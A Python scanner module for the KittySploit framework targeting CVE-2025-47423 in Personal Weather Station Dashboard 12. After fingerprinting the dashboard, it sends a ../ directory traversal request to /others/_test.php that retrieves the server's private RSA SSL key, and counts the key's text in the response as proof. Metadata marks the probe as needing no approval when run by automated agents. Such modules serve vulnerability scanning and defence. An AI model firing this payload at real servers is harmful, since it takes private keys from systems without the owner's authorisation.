#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Personal Weather Station Dashboard 12_lts allows unauthenticated remote attackers to read arbitrary files via ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Personal Weather Station Dashboard 12 - Directory Traversal Detection',
        'description': "Personal Weather Station Dashboard 12_lts allows unauthenticated remote attackers to read arbitrary files via ../ directory traversal in the test parameter to /others/_test.php, as demonstrated by reading the server's private SSL key in cleartext.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'lfi', 'pws', 'traversal', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/Haluka92/CVE-2025-47423', 'https://pwsdashboard.com/'],
        'cve': 'CVE-2025-47423',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('PWS Dashboard</title>',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/others/_test.php?test=../../../apache/conf/ssl.key/server.key'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('BEGIN RSA PRIVATE KEY', 'END RSA PRIVATE KEY',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Personal Weather Station Dashboard 12 - Directory Traversal detected', path=path)
            return True
        return False

